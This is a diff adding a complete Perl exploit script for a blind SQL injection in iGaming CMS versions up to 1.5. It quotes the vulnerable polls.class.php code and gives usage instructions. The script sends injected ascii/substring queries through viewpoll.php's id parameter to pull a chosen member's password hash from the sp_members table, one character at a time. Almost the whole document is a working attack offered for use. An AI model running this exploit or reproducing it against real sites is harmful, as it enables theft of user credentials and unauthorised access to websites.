@@ -1,0 +1,106 @@
+#!/usr/bin/env perl
+
+=pod
+iGaming CMS <= 1.5 Blind SQL Injection
+
+Author: plucky
+Email: io.plucky@gmail.com
+Web Site: http://plucky.heliohost.org
+Crew : WarWolfZ
+
+Usage:   perl exploit.pl <website> <user_id>
+Example: perl exploit.pl http://website.net/iGamingCMS1.5/ 1
+
+Vulnerability: polls.class.php
+[line 10-17]
+
+if (!empty($_REQUEST['id']))
+{
+  $poll = $db->Execute("
+                        SELECT id,title
+                        FROM `sp_polls`
+                        WHERE `id` = '" . $_REQUEST['id'] . "'");
+
+$result = $db->Execute("SELECT * FROM sp_polls_options WHERE poll_id = '$_REQUEST[id]' ORDER BY id"); 
+
+THX TO: shrod and warwolfz crew
+=cut
+
+use strict;
+use warnings;
+use LWP::Simple;
+
+my $password               = '';
+my $vulnerable_page        = '';
+
+my $target_id              =  1;
+
+sub header_exploit {
+   
+   print 'iGaming CMS <= 1.5 Blind SQL Injection'    . "\n".
+         '-----------------------------------------' . "\n".
+         'Author:  plucky'                           . "\n".
+         'Email:   io.plucky@gmail.com'              . "\n".
+         '-----------------------------------------' . "\n".
+         '[!]Target id: '.$target_id                 . "\n".
+         '[!]Exploit Status: Working...'             . "\n";
+}
+
+sub usage_exploit {
+
+   print 'Usage:'                                                    . "\n".
+         '      perl exploit.pl http://[site]/[path]/ [id]'          . "\n".
+         'Examples:'                                                 . "\n".
+         '         perl' . $0 . 'http://web_site/cms/ 1'             . "\n".
+         '         perl' . $0 . 'http://games_site/iGamingCMS1.5/ 1' . "\n";
+
+exit;
+}
+
+sub run_exploit {
+   
+   my $parameter_id           = shift;
+   my $parameter_page         = shift;
+
+   my $target_id              = $$parameter_id;
+   my $vulnerable_page        = $$parameter_page;
+
+   my $character_id           =  1;
+
+   my $HTML_source            = '';
+   my $SQL_Injection          = '';
+   my $hexadecimal_character  = '';
+   my $result                 = '';
+   my $table                  = 'sp_members';
+
+   my @hexadecimal_characters = ( 48..57, 97..102 );
+
+
+   foreach $character_id ( 1..32 ) {
+       
+   character_research:
+          foreach $hexadecimal_character ( @hexadecimal_characters ) {
+
+                 $SQL_Injection  = "viewpoll.php?id=' or ascii(substring((select pass from $table where id=$target_id),$character_id,1))=$hexadecimal_character\%23"; 
+                 $HTML_source = get( $vulnerable_page.$SQL_Injection );
+
+                 if ( $HTML_source !~ /Error/i ) {
+
+                   $result .= chr($hexadecimal_character);
+                   $character_id++;
+
+                   last character_research;
+       }
+     }
+   }
+   
+   return $result;
+}
+
+$vulnerable_page = $ARGV[0] || usage_exploit;
+$target_id       = $ARGV[1] || usage_exploit;
+
+header_exploit;
+$password = run_exploit ( \$target_id, \$vulnerable_page );
+
+print '[!]Password: ', $password, "\n"; 
